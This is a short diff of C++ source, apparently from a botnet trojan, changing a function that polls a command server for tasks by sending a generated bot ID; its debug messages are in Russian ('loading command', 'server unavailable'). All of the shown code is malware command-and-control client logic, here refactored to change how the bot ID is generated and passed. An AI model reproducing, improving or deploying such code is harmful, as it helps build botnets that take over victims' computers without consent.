@@ -367,11 +367,12 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 	if (FreeURL)
     	URL = GetBotScriptURL(SCRIPT_TASK);
 
-	PCHAR BotID = GenerateBotID();
-	TASKDBG("Task", "Загружаем команду: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID);
+	string BotID = GenerateBotID2(GetPrefix(true));
+
+	TASKDBG("Task", "Загружаем команду: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());
 
 	PStrings Fields = Strings::Create();
-	AddURLParam(Fields, "id", BotID);
+	AddURLParam(Fields, "id", BotID.t_str());
 
 	THTTPResponse Response;
 	ClearStruct(Response);
@@ -402,7 +403,6 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 		TASKDBG("Task", "Ошибка загрузки команд. Сервер недоступен");
 
     HTTPResponse::Clear(&Response);
-	STR::Free(BotID);
 	Strings::Free(Fields);
 
 	if (FreeURL)
